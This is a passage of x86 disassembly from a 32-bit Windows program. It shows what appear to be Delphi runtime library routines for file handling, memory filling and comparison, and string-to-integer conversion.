  4030a0:	2d 81 00 00 00       	sub    $0x81,%eax
  4030a5:	73 02                	jae    0x4030a9
  4030a7:	31 c0                	xor    %eax,%eax
  4030a9:	6a 00                	push   $0x0
  4030ab:	6a 00                	push   $0x0
  4030ad:	50                   	push   %eax
  4030ae:	ff 36                	push   (%esi)
  4030b0:	e8 f3 e0 ff ff       	call   0x4011a8
  4030b5:	40                   	inc    %eax
  4030b6:	0f 84 ca 00 00 00    	je     0x403186
  4030bc:	6a 00                	push   $0x0
  4030be:	89 e2                	mov    %esp,%edx
  4030c0:	6a 00                	push   $0x0
  4030c2:	52                   	push   %edx
  4030c3:	68 80 00 00 00       	push   $0x80
  4030c8:	8d 96 4c 01 00 00    	lea    0x14c(%esi),%edx
  4030ce:	52                   	push   %edx
  4030cf:	ff 36                	push   (%esi)
  4030d1:	e8 ba e0 ff ff       	call   0x401190
  4030d6:	5a                   	pop    %edx
  4030d7:	48                   	dec    %eax
  4030d8:	0f 85 a8 00 00 00    	jne    0x403186
  4030de:	31 c0                	xor    %eax,%eax
  4030e0:	39 d0                	cmp    %edx,%eax
  4030e2:	73 6b                	jae    0x40314f
  4030e4:	80 bc 06 4c 01 00 00 	cmpb   $0xe,0x14c(%esi,%eax,1)
  4030eb:	0e 
  4030ec:	74 03                	je     0x4030f1
  4030ee:	40                   	inc    %eax
  4030ef:	eb ef                	jmp    0x4030e0
  4030f1:	6a 02                	push   $0x2
  4030f3:	6a 00                	push   $0x0
  4030f5:	29 d0                	sub    %edx,%eax
  4030f7:	50                   	push   %eax
  4030f8:	ff 36                	push   (%esi)
  4030fa:	e8 a9 e0 ff ff       	call   0x4011a8
  4030ff:	40                   	inc    %eax
  403100:	0f 84 80 00 00 00    	je     0x403186
  403106:	ff 36                	push   (%esi)
  403108:	e8 93 e0 ff ff       	call   0x4011a0
  40310d:	48                   	dec    %eax
  40310e:	75 76                	jne    0x403186
  403110:	eb 3d                	jmp    0x40314f
  403112:	8d 86 4c 01 00 00    	lea    0x14c(%esi),%eax
  403118:	c7 46 08 80 00 00 00 	movl   $0x80,0x8(%esi)
  40311f:	c7 46 24 78 2f 40 00 	movl   $0x402f78,0x24(%esi)
  403126:	89 46 14             	mov    %eax,0x14(%esi)
  403129:	66 81 7e 04 b2 d7    	cmpw   $0xd7b2,0x4(%esi)
  40312f:	74 04                	je     0x403135
  403131:	6a f6                	push   $0xfffffff6
  403133:	eb 0e                	jmp    0x403143
  403135:	81 fe e0 d3 41 00    	cmp    $0x41d3e0,%esi
  40313b:	75 04                	jne    0x403141
  40313d:	6a f4                	push   $0xfffffff4
  40313f:	eb 02                	jmp    0x403143
  403141:	6a f5                	push   $0xfffffff5
  403143:	e8 38 e0 ff ff       	call   0x401180
  403148:	83 f8 ff             	cmp    $0xffffffff,%eax
  40314b:	74 39                	je     0x403186
  40314d:	89 06                	mov    %eax,(%esi)
  40314f:	66 81 7e 04 b1 d7    	cmpw   $0xd7b1,0x4(%esi)
  403155:	74 17                	je     0x40316e
  403157:	ff 36                	push   (%esi)
  403159:	e8 12 e0 ff ff       	call   0x401170
  40315e:	85 c0                	test   %eax,%eax
  403160:	74 10                	je     0x403172
  403162:	83 f8 02             	cmp    $0x2,%eax
  403165:	75 07                	jne    0x40316e
  403167:	c7 46 20 7c 2f 40 00 	movl   $0x402f7c,0x20(%esi)
  40316e:	31 c0                	xor    %eax,%eax
  403170:	5e                   	pop    %esi
  403171:	c3                   	ret
  403172:	ff 36                	push   (%esi)
  403174:	e8 e7 df ff ff       	call   0x401160
  403179:	66 c7 46 04 b0 d7    	movw   $0xd7b0,0x4(%esi)
  40317f:	b8 69 00 00 00       	mov    $0x69,%eax
  403184:	eb ea                	jmp    0x403170
  403186:	66 c7 46 04 b0 d7    	movw   $0xd7b0,0x4(%esi)
  40318c:	e8 6f e0 ff ff       	call   0x401200
  403191:	eb dd                	jmp    0x403170
  403193:	c3                   	ret
  403194:	53                   	push   %ebx
  403195:	56                   	push   %esi
  403196:	8b f2                	mov    %edx,%esi
  403198:	8b d8                	mov    %eax,%ebx
  40319a:	8b c3                	mov    %ebx,%eax
  40319c:	33 c9                	xor    %ecx,%ecx
  40319e:	ba 4c 01 00 00       	mov    $0x14c,%edx
  4031a3:	e8 04 03 00 00       	call   0x4034ac
  4031a8:	8d 83 4c 01 00 00    	lea    0x14c(%ebx),%eax
  4031ae:	89 43 14             	mov    %eax,0x14(%ebx)
  4031b1:	66 c7 43 04 b0 d7    	movw   $0xd7b0,0x4(%ebx)
  4031b7:	33 c0                	xor    %eax,%eax
  4031b9:	a0 30 c0 41 00       	mov    0x41c030,%al
  4031be:	66 89 43 06          	mov    %ax,0x6(%ebx)
  4031c2:	c7 43 08 80 00 00 00 	movl   $0x80,0x8(%ebx)
  4031c9:	c7 43 18 e8 2f 40 00 	movl   $0x402fe8,0x18(%ebx)
  4031d0:	8b c6                	mov    %esi,%eax
  4031d2:	e8 59 1b 00 00       	call   0x404d30
  4031d7:	50                   	push   %eax
  4031d8:	8b c6                	mov    %esi,%eax
  4031da:	e8 51 1d 00 00       	call   0x404f30
  4031df:	8d 53 48             	lea    0x48(%ebx),%edx
  4031e2:	59                   	pop    %ecx
  4031e3:	e8 80 fa ff ff       	call   0x402c68
  4031e8:	8b c6                	mov    %esi,%eax
  4031ea:	e8 41 1b 00 00       	call   0x404d30
  4031ef:	c6 44 03 48 00       	movb   $0x0,0x48(%ebx,%eax,1)
  4031f4:	33 c0                	xor    %eax,%eax
  4031f6:	5e                   	pop    %esi
  4031f7:	5b                   	pop    %ebx
  4031f8:	c3                   	ret
  4031f9:	8d 40 00             	lea    0x0(%eax),%eax
  4031fc:	53                   	push   %ebx
  4031fd:	66 8b 48 04          	mov    0x4(%eax),%cx
  403201:	66 81 e9 b1 d7       	sub    $0xd7b1,%cx
  403206:	74 0f                	je     0x403217
  403208:	49                   	dec    %ecx
  403209:	66 83 e9 02          	sub    $0x2,%cx
  40320d:	73 0c                	jae    0x40321b
  40320f:	8b da                	mov    %edx,%ebx
  403211:	ff d3                	call   *%ebx
  403213:	8b d8                	mov    %eax,%ebx
  403215:	eb 1b                	jmp    0x403232
  403217:	33 db                	xor    %ebx,%ebx
  403219:	eb 17                	jmp    0x403232
  40321b:	3d 14 d2 41 00       	cmp    $0x41d214,%eax
  403220:	74 07                	je     0x403229
  403222:	3d e0 d3 41 00       	cmp    $0x41d3e0,%eax
  403227:	75 04                	jne    0x40322d
  403229:	33 db                	xor    %ebx,%ebx
  40322b:	eb 05                	jmp    0x403232
  40322d:	bb 67 00 00 00       	mov    $0x67,%ebx
  403232:	85 db                	test   %ebx,%ebx
  403234:	74 07                	je     0x40323d
  403236:	8b c3                	mov    %ebx,%eax
  403238:	e8 cb f8 ff ff       	call   0x402b08
  40323d:	8b c3                	mov    %ebx,%eax
  40323f:	5b                   	pop    %ebx
  403240:	c3                   	ret
  403241:	8d 40 00             	lea    0x0(%eax),%eax
  403244:	8b 50 1c             	mov    0x1c(%eax),%edx
  403247:	e8 b0 ff ff ff       	call   0x4031fc
  40324c:	c3                   	ret
  40324d:	8d 40 00             	lea    0x0(%eax),%eax
  403250:	ff 25 98 f1 e1 00    	jmp    *0xe1f198
  403256:	8b c0                	mov    %eax,%eax
  403258:	ff 25 84 f1 e1 00    	jmp    *0xe1f184
  40325e:	8b c0                	mov    %eax,%eax
  403260:	55                   	push   %ebp
  403261:	8b ec                	mov    %esp,%ebp
  403263:	51                   	push   %ecx
  403264:	53                   	push   %ebx
  403265:	56                   	push   %esi
  403266:	57                   	push   %edi
  403267:	8b f1                	mov    %ecx,%esi
  403269:	8b fa                	mov    %edx,%edi
  40326b:	8b d8                	mov    %eax,%ebx
  40326d:	8b 45 10             	mov    0x10(%ebp),%eax
  403270:	0f b7 53 04          	movzwl 0x4(%ebx),%edx
  403274:	23 d0                	and    %eax,%edx
  403276:	3b c2                	cmp    %edx,%eax
  403278:	75 58                	jne    0x4032d2
  40327a:	6a 00                	push   $0x0
  40327c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40327f:	50                   	push   %eax
  403280:	8b 43 08             	mov    0x8(%ebx),%eax
  403283:	f7 ee                	imul   %esi
  403285:	50                   	push   %eax
  403286:	57                   	push   %edi
  403287:	8b 03                	mov    (%ebx),%eax
  403289:	50                   	push   %eax
  40328a:	ff 55 0c             	call   *0xc(%ebp)
  40328d:	85 c0                	test   %eax,%eax
  40328f:	75 11                	jne    0x4032a2
  403291:	e8 6a df ff ff       	call   0x401200
  403296:	e8 6d f8 ff ff       	call   0x402b08
  40329b:	33 c0                	xor    %eax,%eax
  40329d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4032a0:	eb 3f                	jmp    0x4032e1
  4032a2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4032a5:	33 d2                	xor    %edx,%edx
  4032a7:	f7 73 08             	divl   0x8(%ebx)
  4032aa:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4032ad:	8b 45 14             	mov    0x14(%ebp),%eax
  4032b0:	85 c0                	test   %eax,%eax
  4032b2:	74 0a                	je     0x4032be
  4032b4:	8b 45 14             	mov    0x14(%ebp),%eax
  4032b7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4032ba:	89 10                	mov    %edx,(%eax)
  4032bc:	eb 23                	jmp    0x4032e1
  4032be:	3b 75 fc             	cmp    -0x4(%ebp),%esi
  4032c1:	74 1e                	je     0x4032e1
  4032c3:	8b 45 08             	mov    0x8(%ebp),%eax
  4032c6:	e8 3d f8 ff ff       	call   0x402b08
  4032cb:	33 c0                	xor    %eax,%eax
  4032cd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4032d0:	eb 0f                	jmp    0x4032e1
  4032d2:	b8 67 00 00 00       	mov    $0x67,%eax
  4032d7:	e8 2c f8 ff ff       	call   0x402b08
  4032dc:	33 c0                	xor    %eax,%eax
  4032de:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4032e1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4032e4:	5f                   	pop    %edi
  4032e5:	5e                   	pop    %esi
  4032e6:	5b                   	pop    %ebx
  4032e7:	59                   	pop    %ecx
  4032e8:	5d                   	pop    %ebp
  4032e9:	c2 10 00             	ret    $0x10
  4032ec:	55                   	push   %ebp
  4032ed:	8b ec                	mov    %esp,%ebp
  4032ef:	53                   	push   %ebx
  4032f0:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4032f3:	53                   	push   %ebx
  4032f4:	68 b1 d7 00 00       	push   $0xd7b1
  4032f9:	68 50 32 40 00       	push   $0x403250
  4032fe:	6a 64                	push   $0x64
  403300:	e8 5b ff ff ff       	call   0x403260
  403305:	5b                   	pop    %ebx
  403306:	5d                   	pop    %ebp
  403307:	c2 04 00             	ret    $0x4
  40330a:	8b c0                	mov    %eax,%eax
  40330c:	55                   	push   %ebp
  40330d:	8b ec                	mov    %esp,%ebp
  40330f:	53                   	push   %ebx
  403310:	8b 5d 08             	mov    0x8(%ebp),%ebx
  403313:	53                   	push   %ebx
  403314:	68 b2 d7 00 00       	push   $0xd7b2
  403319:	68 58 32 40 00       	push   $0x403258
  40331e:	6a 65                	push   $0x65
  403320:	e8 3b ff ff ff       	call   0x403260
  403325:	5b                   	pop    %ebx
  403326:	5d                   	pop    %ebp
  403327:	c2 04 00             	ret    $0x4
  40332a:	8b c0                	mov    %eax,%eax
  40332c:	53                   	push   %ebx
  40332d:	56                   	push   %esi
  40332e:	8b d8                	mov    %eax,%ebx
  403330:	33 f6                	xor    %esi,%esi
  403332:	66 8b 43 04          	mov    0x4(%ebx),%ax
  403336:	66 3d b1 d7          	cmp    $0xd7b1,%ax
  40333a:	72 2f                	jb     0x40336b
  40333c:	66 3d b3 d7          	cmp    $0xd7b3,%ax
  403340:	77 29                	ja     0x40336b
  403342:	66 25 b2 d7          	and    $0xd7b2,%ax
  403346:	66 3d b2 d7          	cmp    $0xd7b2,%ax
  40334a:	75 07                	jne    0x403353
  40334c:	8b c3                	mov    %ebx,%eax
  40334e:	ff 53 1c             	call   *0x1c(%ebx)
  403351:	8b f0                	mov    %eax,%esi
  403353:	85 f6                	test   %esi,%esi
  403355:	75 07                	jne    0x40335e
  403357:	8b c3                	mov    %ebx,%eax
  403359:	ff 53 24             	call   *0x24(%ebx)
  40335c:	8b f0                	mov    %eax,%esi
  40335e:	85 f6                	test   %esi,%esi
  403360:	74 1b                	je     0x40337d
  403362:	8b c6                	mov    %esi,%eax
  403364:	e8 9f f7 ff ff       	call   0x402b08
  403369:	eb 12                	jmp    0x40337d
  40336b:	81 fb 48 d0 41 00    	cmp    $0x41d048,%ebx
  403371:	74 0a                	je     0x40337d
  403373:	b8 67 00 00 00       	mov    $0x67,%eax
  403378:	e8 8b f7 ff ff       	call   0x402b08
  40337d:	8b c6                	mov    %esi,%eax
  40337f:	5e                   	pop    %esi
  403380:	5b                   	pop    %ebx
  403381:	c3                   	ret
  403382:	8b c0                	mov    %eax,%eax
  403384:	53                   	push   %ebx
  403385:	8a 1a                	mov    (%edx),%bl
  403387:	3a cb                	cmp    %bl,%cl
  403389:	76 02                	jbe    0x40338d
  40338b:	8b cb                	mov    %ebx,%ecx
  40338d:	88 08                	mov    %cl,(%eax)
  40338f:	42                   	inc    %edx
  403390:	40                   	inc    %eax
  403391:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  403397:	92                   	xchg   %eax,%edx
  403398:	e8 cb f8 ff ff       	call   0x402c68
  40339d:	5b                   	pop    %ebx
  40339e:	c3                   	ret
  40339f:	90                   	nop
  4033a0:	53                   	push   %ebx
  4033a1:	56                   	push   %esi
  4033a2:	51                   	push   %ecx
  4033a3:	89 ce                	mov    %ecx,%esi
  4033a5:	c1 ee 02             	shr    $0x2,%esi
  4033a8:	74 26                	je     0x4033d0
  4033aa:	8b 08                	mov    (%eax),%ecx
  4033ac:	8b 1a                	mov    (%edx),%ebx
  4033ae:	39 d9                	cmp    %ebx,%ecx
  4033b0:	75 45                	jne    0x4033f7
  4033b2:	4e                   	dec    %esi
  4033b3:	74 15                	je     0x4033ca
  4033b5:	8b 48 04             	mov    0x4(%eax),%ecx
  4033b8:	8b 5a 04             	mov    0x4(%edx),%ebx
  4033bb:	39 d9                	cmp    %ebx,%ecx
  4033bd:	75 38                	jne    0x4033f7
  4033bf:	83 c0 08             	add    $0x8,%eax
  4033c2:	83 c2 08             	add    $0x8,%edx
  4033c5:	4e                   	dec    %esi
  4033c6:	75 e2                	jne    0x4033aa
  4033c8:	eb 06                	jmp    0x4033d0
  4033ca:	83 c0 04             	add    $0x4,%eax
  4033cd:	83 c2 04             	add    $0x4,%edx
  4033d0:	5e                   	pop    %esi
  4033d1:	83 e6 03             	and    $0x3,%esi
  4033d4:	74 36                	je     0x40340c
  4033d6:	8a 08                	mov    (%eax),%cl
  4033d8:	3a 0a                	cmp    (%edx),%cl
  4033da:	75 30                	jne    0x40340c
  4033dc:	4e                   	dec    %esi
  4033dd:	74 13                	je     0x4033f2
  4033df:	8a 48 01             	mov    0x1(%eax),%cl
  4033e2:	3a 4a 01             	cmp    0x1(%edx),%cl
  4033e5:	75 25                	jne    0x40340c
  4033e7:	4e                   	dec    %esi
  4033e8:	74 08                	je     0x4033f2
  4033ea:	8a 48 02             	mov    0x2(%eax),%cl
  4033ed:	3a 4a 02             	cmp    0x2(%edx),%cl
  4033f0:	75 1a                	jne    0x40340c
  4033f2:	31 c0                	xor    %eax,%eax
  4033f4:	5e                   	pop    %esi
  4033f5:	5b                   	pop    %ebx
  4033f6:	c3                   	ret
  4033f7:	5e                   	pop    %esi
  4033f8:	38 d9                	cmp    %bl,%cl
  4033fa:	75 10                	jne    0x40340c
  4033fc:	38 fd                	cmp    %bh,%ch
  4033fe:	75 0c                	jne    0x40340c
  403400:	c1 e9 10             	shr    $0x10,%ecx
  403403:	c1 eb 10             	shr    $0x10,%ebx
  403406:	38 d9                	cmp    %bl,%cl
  403408:	75 02                	jne    0x40340c
  40340a:	38 fd                	cmp    %bh,%ch
  40340c:	5e                   	pop    %esi
  40340d:	5b                   	pop    %ebx
  40340e:	c3                   	ret
  40340f:	90                   	nop
  403410:	53                   	push   %ebx
  403411:	56                   	push   %esi
  403412:	8b d8                	mov    %eax,%ebx
  403414:	66 8b 43 04          	mov    0x4(%ebx),%ax
  403418:	66 3d b0 d7          	cmp    $0xd7b0,%ax
  40341c:	76 2d                	jbe    0x40344b
  40341e:	66 3d b3 d7          	cmp    $0xd7b3,%ax
  403422:	77 27                	ja     0x40344b
  403424:	6a 01                	push   $0x1
  403426:	6a 00                	push   $0x0
  403428:	6a 00                	push   $0x0
  40342a:	8b 03                	mov    (%ebx),%eax
  40342c:	50                   	push   %eax
  40342d:	e8 76 dd ff ff       	call   0x4011a8
  403432:	8b f0                	mov    %eax,%esi
  403434:	83 fe ff             	cmp    $0xffffffff,%esi
  403437:	75 07                	jne    0x403440
  403439:	e8 da f6 ff ff       	call   0x402b18
  40343e:	eb 18                	jmp    0x403458
  403440:	8b c6                	mov    %esi,%eax
  403442:	33 d2                	xor    %edx,%edx
  403444:	f7 73 08             	divl   0x8(%ebx)
  403447:	8b f0                	mov    %eax,%esi
  403449:	eb 0d                	jmp    0x403458
  40344b:	b8 67 00 00 00       	mov    $0x67,%eax
  403450:	e8 b3 f6 ff ff       	call   0x402b08
  403455:	83 ce ff             	or     $0xffffffff,%esi
  403458:	8b c6                	mov    %esi,%eax
  40345a:	5e                   	pop    %esi
  40345b:	5b                   	pop    %ebx
  40345c:	c3                   	ret
  40345d:	8d 40 00             	lea    0x0(%eax),%eax
  403460:	53                   	push   %ebx
  403461:	56                   	push   %esi
  403462:	8b d8                	mov    %eax,%ebx
  403464:	83 ce ff             	or     $0xffffffff,%esi
  403467:	66 8b 43 04          	mov    0x4(%ebx),%ax
  40346b:	66 3d b0 d7          	cmp    $0xd7b0,%ax
  40346f:	76 29                	jbe    0x40349a
  403471:	66 3d b3 d7          	cmp    $0xd7b3,%ax
  403475:	77 23                	ja     0x40349a
  403477:	6a 00                	push   $0x0
  403479:	8b 03                	mov    (%ebx),%eax
  40347b:	50                   	push   %eax
  40347c:	e8 f7 dc ff ff       	call   0x401178
  403481:	8b f0                	mov    %eax,%esi
  403483:	83 fe ff             	cmp    $0xffffffff,%esi
  403486:	75 07                	jne    0x40348f
  403488:	e8 8b f6 ff ff       	call   0x402b18
  40348d:	eb 15                	jmp    0x4034a4
  40348f:	8b c6                	mov    %esi,%eax
  403491:	33 d2                	xor    %edx,%edx
  403493:	f7 73 08             	divl   0x8(%ebx)
  403496:	8b f0                	mov    %eax,%esi
  403498:	eb 0a                	jmp    0x4034a4
  40349a:	b8 67 00 00 00       	mov    $0x67,%eax
  40349f:	e8 64 f6 ff ff       	call   0x402b08
  4034a4:	8b c6                	mov    %esi,%eax
  4034a6:	5e                   	pop    %esi
  4034a7:	5b                   	pop    %ebx
  4034a8:	c3                   	ret
  4034a9:	8d 40 00             	lea    0x0(%eax),%eax
  4034ac:	57                   	push   %edi
  4034ad:	89 c7                	mov    %eax,%edi
  4034af:	88 cd                	mov    %cl,%ch
  4034b1:	89 c8                	mov    %ecx,%eax
  4034b3:	c1 e0 10             	shl    $0x10,%eax
  4034b6:	66 89 c8             	mov    %cx,%ax
  4034b9:	89 d1                	mov    %edx,%ecx
  4034bb:	c1 f9 02             	sar    $0x2,%ecx
  4034be:	78 09                	js     0x4034c9
  4034c0:	f3 ab                	rep stos %eax,%es:(%edi)
  4034c2:	89 d1                	mov    %edx,%ecx
  4034c4:	83 e1 03             	and    $0x3,%ecx
  4034c7:	f3 aa                	rep stos %al,%es:(%edi)
  4034c9:	5f                   	pop    %edi
  4034ca:	c3                   	ret
  4034cb:	90                   	nop
  4034cc:	53                   	push   %ebx
  4034cd:	56                   	push   %esi
  4034ce:	8b d8                	mov    %eax,%ebx
  4034d0:	66 c7 43 04 b0 d7    	movw   $0xd7b0,0x4(%ebx)
  4034d6:	33 f6                	xor    %esi,%esi
  4034d8:	8b 03                	mov    (%ebx),%eax
  4034da:	e8 d9 fa ff ff       	call   0x402fb8
  4034df:	84 c0                	test   %al,%al
  4034e1:	75 0a                	jne    0x4034ed
  4034e3:	e8 30 f6 ff ff       	call   0x402b18
  4034e8:	be 01 00 00 00       	mov    $0x1,%esi
  4034ed:	8b c6                	mov    %esi,%eax
  4034ef:	5e                   	pop    %esi
  4034f0:	5b                   	pop    %ebx
  4034f1:	c3                   	ret
  4034f2:	8b c0                	mov    %eax,%eax
  4034f4:	53                   	push   %ebx
  4034f5:	56                   	push   %esi
  4034f6:	57                   	push   %edi
  4034f7:	89 d6                	mov    %edx,%esi
  4034f9:	89 cf                	mov    %ecx,%edi
  4034fb:	31 d2                	xor    %edx,%edx
  4034fd:	89 c3                	mov    %eax,%ebx
  4034ff:	66 8b 50 04          	mov    0x4(%eax),%dx
  403503:	81 ea b0 d7 00 00    	sub    $0xd7b0,%edx
  403509:	74 15                	je     0x403520
  40350b:	83 fa 03             	cmp    $0x3,%edx
  40350e:	0f 87 a2 00 00 00    	ja     0x4035b6
  403514:	ff 53 24             	call   *0x24(%ebx)
  403517:	85 c0                	test   %eax,%eax
  403519:	74 05                	je     0x403520
  40351b:	e8 e8 f5 ff ff       	call   0x402b08
  403520:	66 c7 43 04 b3 d7    	movw   $0xd7b3,0x4(%ebx)
  403526:	89 73 08             	mov    %esi,0x8(%ebx)
  403529:	c7 43 24 cc 34 40 00 	movl   $0x4034cc,0x24(%ebx)
  403530:	c7 43 1c 78 2f 40 00 	movl   $0x402f78,0x1c(%ebx)
  403537:	80 7b 48 00          	cmpb   $0x0,0x48(%ebx)
  40353b:	74 60                	je     0x40359d
  40353d:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  403542:	8a 15 08 c0 41 00    	mov    0x41c008,%dl
  403548:	83 e2 70             	and    $0x70,%edx
  40354b:	c1 ea 02             	shr    $0x2,%edx
  40354e:	8b 92 64 c0 41 00    	mov    0x41c064(%edx),%edx
  403554:	b9 02 00 00 00       	mov    $0x2,%ecx
  403559:	83 ef 03             	sub    $0x3,%edi
  40355c:	74 21                	je     0x40357f
  40355e:	b9 03 00 00 00       	mov    $0x3,%ecx
  403563:	47                   	inc    %edi
  403564:	74 19                	je     0x40357f
  403566:	b8 00 00 00 40       	mov    $0x40000000,%eax
  40356b:	47                   	inc    %edi
  40356c:	66 c7 43 04 b2 d7    	movw   $0xd7b2,0x4(%ebx)
  403572:	74 0b                	je     0x40357f
  403574:	b8 00 00 00 80       	mov    $0x80000000,%eax
  403579:	66 c7 43 04 b1 d7    	movw   $0xd7b1,0x4(%ebx)
  40357f:	6a 00                	push   $0x0
  403581:	68 80 00 00 00       	push   $0x80
  403586:	51                   	push   %ecx
  403587:	6a 00                	push   $0x0
  403589:	52                   	push   %edx
  40358a:	50                   	push   %eax
  40358b:	8d 43 48             	lea    0x48(%ebx),%eax
  40358e:	50                   	push   %eax
  40358f:	e8 d4 db ff ff       	call   0x401168
  403594:	83 f8 ff             	cmp    $0xffffffff,%eax
  403597:	74 24                	je     0x4035bd
  403599:	89 03                	mov    %eax,(%ebx)
  40359b:	eb 30                	jmp    0x4035cd
  40359d:	c7 43 24 78 2f 40 00 	movl   $0x402f78,0x24(%ebx)
  4035a4:	83 ff 03             	cmp    $0x3,%edi
  4035a7:	74 04                	je     0x4035ad
  4035a9:	6a f6                	push   $0xfffffff6
  4035ab:	eb 02                	jmp    0x4035af
  4035ad:	6a f5                	push   $0xfffffff5
  4035af:	e8 cc db ff ff       	call   0x401180
  4035b4:	eb de                	jmp    0x403594
  4035b6:	b8 66 00 00 00       	mov    $0x66,%eax
  4035bb:	eb 0b                	jmp    0x4035c8
  4035bd:	66 c7 43 04 b0 d7    	movw   $0xd7b0,0x4(%ebx)
  4035c3:	e8 38 dc ff ff       	call   0x401200
  4035c8:	e8 3b f5 ff ff       	call   0x402b08
  4035cd:	5f                   	pop    %edi
  4035ce:	5e                   	pop    %esi
  4035cf:	5b                   	pop    %ebx
  4035d0:	c3                   	ret
  4035d1:	8d 40 00             	lea    0x0(%eax),%eax
  4035d4:	8a 0d 08 c0 41 00    	mov    0x41c008,%cl
  4035da:	80 e1 03             	and    $0x3,%cl
  4035dd:	80 f9 02             	cmp    $0x2,%cl
  4035e0:	76 02                	jbe    0x4035e4
  4035e2:	b1 02                	mov    $0x2,%cl
  4035e4:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  4035ea:	e8 05 ff ff ff       	call   0x4034f4
  4035ef:	c3                   	ret
  4035f0:	b9 03 00 00 00       	mov    $0x3,%ecx
  4035f5:	e8 fa fe ff ff       	call   0x4034f4
  4035fa:	c3                   	ret
  4035fb:	90                   	nop
  4035fc:	89 c1                	mov    %eax,%ecx
  4035fe:	0f b7 40 04          	movzwl 0x4(%eax),%eax
  403602:	2d b1 d7 00 00       	sub    $0xd7b1,%eax
  403607:	83 f8 02             	cmp    $0x2,%eax
  40360a:	77 19                	ja     0x403625
  40360c:	6a 00                	push   $0x0
  40360e:	8b 41 08             	mov    0x8(%ecx),%eax
  403611:	f7 e2                	mul    %edx
  403613:	6a 00                	push   $0x0
  403615:	50                   	push   %eax
  403616:	ff 31                	push   (%ecx)
  403618:	e8 8b db ff ff       	call   0x4011a8
  40361d:	40                   	inc    %eax
  40361e:	0f 84 f4 f4 ff ff    	je     0x402b18
  403624:	c3                   	ret
  403625:	b8 67 00 00 00       	mov    $0x67,%eax
  40362a:	e9 d9 f4 ff ff       	jmp    0x402b08
  40362f:	c3                   	ret
  403630:	53                   	push   %ebx
  403631:	56                   	push   %esi
  403632:	57                   	push   %edi
  403633:	89 c6                	mov    %eax,%esi
  403635:	50                   	push   %eax
  403636:	85 c0                	test   %eax,%eax
  403638:	74 6c                	je     0x4036a6
  40363a:	31 c0                	xor    %eax,%eax
  40363c:	31 db                	xor    %ebx,%ebx
  40363e:	bf cc cc cc 0c       	mov    $0xccccccc,%edi
  403643:	8a 1e                	mov    (%esi),%bl
  403645:	46                   	inc    %esi
  403646:	80 fb 20             	cmp    $0x20,%bl
  403649:	74 f8                	je     0x403643
  40364b:	b5 00                	mov    $0x0,%ch
  40364d:	80 fb 2d             	cmp    $0x2d,%bl
  403650:	74 62                	je     0x4036b4
  403652:	80 fb 2b             	cmp    $0x2b,%bl
  403655:	74 5f                	je     0x4036b6
  403657:	80 fb 24             	cmp    $0x24,%bl
  40365a:	74 5f                	je     0x4036bb
  40365c:	80 fb 78             	cmp    $0x78,%bl
  40365f:	74 5a                	je     0x4036bb
  403661:	80 fb 58             	cmp    $0x58,%bl
  403664:	74 55                	je     0x4036bb
  403666:	80 fb 30             	cmp    $0x30,%bl
  403669:	75 13                	jne    0x40367e
  40366b:	8a 1e                	mov    (%esi),%bl
  40366d:	46                   	inc    %esi
  40366e:	80 fb 78             	cmp    $0x78,%bl
  403671:	74 48                	je     0x4036bb
  403673:	80 fb 58             	cmp    $0x58,%bl
  403676:	74 43                	je     0x4036bb
  403678:	84 db                	test   %bl,%bl
  40367a:	74 20                	je     0x40369c
  40367c:	eb 04                	jmp    0x403682
  40367e:	84 db                	test   %bl,%bl
  403680:	74 2d                	je     0x4036af
  403682:	80 eb 30             	sub    $0x30,%bl
  403685:	80 fb 09             	cmp    $0x9,%bl
  403688:	77 25                	ja     0x4036af
  40368a:	39 f8                	cmp    %edi,%eax
  40368c:	77 21                	ja     0x4036af
  40368e:	8d 04 80             	lea    (%eax,%eax,4),%eax
  403691:	01 c0                	add    %eax,%eax
  403693:	01 d8                	add    %ebx,%eax
  403695:	8a 1e                	mov    (%esi),%bl
  403697:	46                   	inc    %esi
  403698:	84 db                	test   %bl,%bl
  40369a:	75 e6                	jne    0x403682
  40369c:	fe cd                	dec    %ch
  40369e:	74 09                	je     0x4036a9
  4036a0:	85 c0                	test   %eax,%eax
  4036a2:	7d 54                	jge    0x4036f8
  4036a4:	eb 09                	jmp    0x4036af
  4036a6:	46                   	inc    %esi
  4036a7:	eb 06                	jmp    0x4036af
  4036a9:	f7 d8                	neg    %eax
  4036ab:	7e 4b                	jle    0x4036f8
  4036ad:	78 49                	js     0x4036f8
  4036af:	5b                   	pop    %ebx
  4036b0:	29 de                	sub    %ebx,%esi
  4036b2:	eb 47                	jmp    0x4036fb
  4036b4:	fe c5                	inc    %ch
  4036b6:	8a 1e                	mov    (%esi),%bl
  4036b8:	46                   	inc    %esi
  4036b9:	eb 9c                	jmp    0x403657
  4036bb:	bf ff ff ff 0f       	mov    $0xfffffff,%edi
  4036c0:	8a 1e                	mov    (%esi),%bl
  4036c2:	46                   	inc    %esi
  4036c3:	84 db                	test   %bl,%bl
  4036c5:	74 df                	je     0x4036a6
  4036c7:	80 fb 61             	cmp    $0x61,%bl
  4036ca:	72 03                	jb     0x4036cf
  4036cc:	80 eb 20             	sub    $0x20,%bl
  4036cf:	80 eb 30             	sub    $0x30,%bl
  4036d2:	80 fb 09             	cmp    $0x9,%bl
  4036d5:	76 0b                	jbe    0x4036e2
  4036d7:	80 eb 11             	sub    $0x11,%bl
  4036da:	80 fb 05             	cmp    $0x5,%bl
  4036dd:	77 d0                	ja     0x4036af
  4036df:	80 c3 0a             	add    $0xa,%bl
  4036e2:	39 f8                	cmp    %edi,%eax
  4036e4:	77 c9                	ja     0x4036af
  4036e6:	c1 e0 04             	shl    $0x4,%eax
  4036e9:	01 d8                	add    %ebx,%eax
  4036eb:	8a 1e                	mov    (%esi),%bl
  4036ed:	46                   	inc    %esi
  4036ee:	84 db                	test   %bl,%bl
  4036f0:	75 d5                	jne    0x4036c7
  4036f2:	fe cd                	dec    %ch
  4036f4:	75 02                	jne    0x4036f8
  4036f6:	f7 d8                	neg    %eax
  4036f8:	59                   	pop    %ecx
